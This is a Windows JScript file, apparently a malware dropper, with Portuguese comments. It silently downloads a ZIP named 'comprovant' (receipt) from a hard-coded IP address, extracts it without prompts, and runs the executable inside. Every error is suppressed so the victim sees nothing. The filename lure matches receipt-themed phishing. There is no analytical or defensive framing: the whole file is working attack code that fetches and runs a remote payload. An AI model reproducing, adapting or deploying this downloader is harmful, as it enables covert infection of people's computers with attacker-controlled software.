var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

// URL do arquivo ZIP
var url = "http://190.111.98.121:83/comprovant.zip";

// Nome do arquivo ZIP local
var zipFileName = "comprovant.zip";

// Diretório onde o ZIP será extraído
var extractPath = "./extracted";

// Nome do executável a ser executado
var executableName = "comprovant.exe";

// Função para baixar o arquivo
function downloadFile(url, outputPath) {
    try {
        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
        xhr.open("GET", url, false); // Sincroniza a requisição
        xhr.send();
        if (xhr.status === 200) {
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Open();
            stream.Type = 1; // Tipo binário
            stream.Write(xhr.ResponseBody);
            stream.Position = 0;
            stream.SaveToFile(outputPath, 2); // Sobrescreve o arquivo se existir
            stream.Close();
        } else {
            throw new Error("Erro ao baixar o arquivo. Código de status: " + xhr.status);
        }
    } catch (e) {
        // Não exibe mensagem de erro, mas encerra o script
        WScript.Quit(1);
    }
}

// Função para extrair o ZIP
function extractZip(zipFilePath, outputDir) {
    try {
        // Verifica se o arquivo ZIP existe
        if (!fso.FileExists(zipFilePath)) {
            throw new Error("Arquivo ZIP não encontrado.");
        }

        // Cria o diretório de destino, se necessário
        if (!fso.FolderExists(outputDir)) {
            fso.CreateFolder(outputDir);
        }

        // Acessa o arquivo ZIP usando Shell.Application
        var app = new ActiveXObject("Shell.Application");
        var source = app.NameSpace(fso.GetAbsolutePathName(zipFilePath));
        if (!source || !source.Items()) {
            throw new Error("Não foi possível acessar o arquivo ZIP.");
        }

        var target = app.NameSpace(fso.GetAbsolutePathName(outputDir));
        if (!target) {
            throw new Error("Não foi possível acessar o diretório de destino.");
        }

        // Extrai os arquivos
        target.CopyHere(source.Items(), 16); // 16 = Não exibe prompts
    } catch (e) {
        // Não exibe mensagem de erro, mas encerra o script
        WScript.Quit(1);
    }
}

// Função para executar o arquivo
function executeFile(filePath) {
    try {
        if (fso.FileExists(filePath)) {
            shell.Run(fso.GetAbsolutePathName(filePath), 1, false);
        } else {
            throw new Error("Arquivo executável não encontrado.");
        }
    } catch (e) {
        // Não exibe mensagem de erro, mas encerra o script
        WScript.Quit(1);
    }
}

// Fluxo principal
try {
    // Passo 1: Baixar o arquivo ZIP
    downloadFile(url, zipFileName);

    // Passo 2: Extrair o arquivo ZIP
    extractZip(zipFileName, extractPath);

    // Passo 3: Executar o arquivo comprovant.exe
    var executablePath = fso.BuildPath(extractPath, executableName);
    executeFile(executablePath);
} catch (e) {
    // Encerra silenciosamente em caso de erro
    WScript.Quit(1);
}